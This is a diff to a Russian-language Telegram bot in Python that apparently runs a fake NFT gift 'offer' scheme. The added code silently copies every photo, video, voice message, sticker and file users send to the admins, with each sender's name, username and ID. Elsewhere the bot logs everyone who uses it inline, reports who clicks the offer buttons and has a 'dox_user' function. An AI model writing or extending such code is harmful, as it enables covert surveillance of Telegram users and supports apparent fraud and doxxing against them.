@@ -109,7 +109,6 @@ async def inline_handler(inline_query: InlineQuery):
     query = inline_query.query.strip()
     username = f"@{inline_query.from_user.username}" if inline_query.from_user.username else "без юзернейма"
     
-    # Сохраняем в базу всех, кто пишет в инлайне
     cursor.execute('INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)', 
                    (inline_query.from_user.id, inline_query.from_user.username, inline_query.from_user.first_name))
     conn.commit()
@@ -117,7 +116,6 @@ async def inline_handler(inline_query: InlineQuery):
     if not query:
         return
         
-    # Определяем, где человек пишет
     chat_types = {
         "sender": "в личке",
         "private": "в личке",
@@ -182,7 +180,6 @@ async def accept_callback(callback: CallbackQuery):
     offer_id = callback.data.split("_")[1]
     offer = active_offers.get(offer_id, {"link": "t.me/nft/LunarSnake-120435", "price": "600", "gift": "Gift"})
     
-    # --- УВЕДОМЛЕНИЕ О ТОМ, КТО НАЖАЛ ---
     username = f"@{callback.from_user.username}" if callback.from_user.username else "без юзернейма"
     who_clicked = f"{callback.from_user.first_name} ({username}, ID: {callback.from_user.id})"
     
@@ -197,7 +194,6 @@ async def accept_callback(callback: CallbackQuery):
         f"👤 Кто нажал: {who_clicked}\n"
         f"📍 Где: {chat_info}"
     )
-    # ------------------------------------
     
     accepted_text = (
         f"✅ Оффер принят!\n"
@@ -231,7 +227,6 @@ async def decline_callback(callback: CallbackQuery):
     offer_id = callback.data.split("_")[1]
     offer = active_offers.get(offer_id, {"link": "t.me/nft/LunarSnake-120435", "price": "600", "gift": "Gift"})
     
-    # --- УВЕДОМЛЕНИЕ О ТОМ, КТО ОТКЛОНИЛ ---
     username = f"@{callback.from_user.username}" if callback.from_user.username else "без юзернейма"
     who_clicked = f"{callback.from_user.first_name} ({username}, ID: {callback.from_user.id})"
     
@@ -245,7 +240,6 @@ async def decline_callback(callback: CallbackQuery):
         f"👤 Кто нажал: {who_clicked}\n"
         f"📍 Где: {chat_info}"
     )
-    # --------------------------------------
     
     declined_text = "❌ Оффер отклонен."
     await callback.answer("❌ Оффер отклонен.", show_alert=True)
@@ -430,19 +424,54 @@ async def dox_user(message: Message):
         await message.answer("❌ Ошибка! Пользователь не найден или скрыл данные.")
 
 # ==========================================
-# УВЕДОМЛЕНИЯ ОБ ОБЫЧНЫХ СООБЩЕНИЯХ
+# УВЕДОМЛЕНИЯ ОБ ОБЫЧНЫХ СООБЩЕНИЯХ И МЕДИА
 # ==========================================
-@router.message(F.text & ~F.text.startswith("/") & ~F.text.startswith("."))
-async def any_message_handler(message: Message):
+def get_user_info(message: Message) -> str:
     username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"
+    return f"👤 От: {message.from_user.first_name} ({username}, ID: {message.from_user.id})"
+
+async def forward_to_admins(message: Message, media_type: str):
+    cursor.execute('SELECT user_id FROM admins')
+    admin_ids = [row[0] for row in cursor.fetchall()]
     
+    for admin_id in admin_ids:
+        try:
+            await bot.send_message(admin_id, f"📎 Прислали {media_type}!\n{get_user_info(message)}")
+            await message.copy_to(chat_id=admin_id)
+        except Exception as e:
+            pass
+
+@router.message(F.text & ~F.text.startswith("/") & ~F.text.startswith("."))
+async def text_handler(message: Message):
     await notify_admin(
         f"💬 Новое сообщение!\n"
-        f"Имя: {message.from_user.first_name}\n"
-        f"Юзернейм: {username}\n"
-        f"ID: {message.from_user.id}\n"
+        f"{get_user_info(message)}\n"
         f"Текст: {message.text}"
     )
+
+@router.message(F.photo)
+async def photo_handler(message: Message):
+    await forward_to_admins(message, "фото 🖼")
+
+@router.message(F.video)
+async def video_handler(message: Message):
+    await forward_to_admins(message, "видео 🎬")
+
+@router.message(F.animation)
+async def gif_handler(message: Message):
+    await forward_to_admins(message, "гифку 🎞")
+
+@router.message(F.sticker)
+async def sticker_handler(message: Message):
+    await forward_to_admins(message, "стикер 🐱")
+
+@router.message(F.voice)
+async def voice_handler(message: Message):
+    await forward_to_admins(message, "голосовое сообщение 🎤")
+
+@router.message(F.document)
+async def document_handler(message: Message):
+    await forward_to_admins(message, "файл 📁")
 
 # ==========================================
 # ЗАПУСК БОТА
@@ -456,9 +485,6 @@ async def main():
         await dp.start_polling(bot)
     except Exception as e:
         print(f"ОШИБКА: {e}")
-
-if __name__ == "__main__":
-    asyncio.run(main())
 
 if __name__ == "__main__":
     asyncio.run(main())
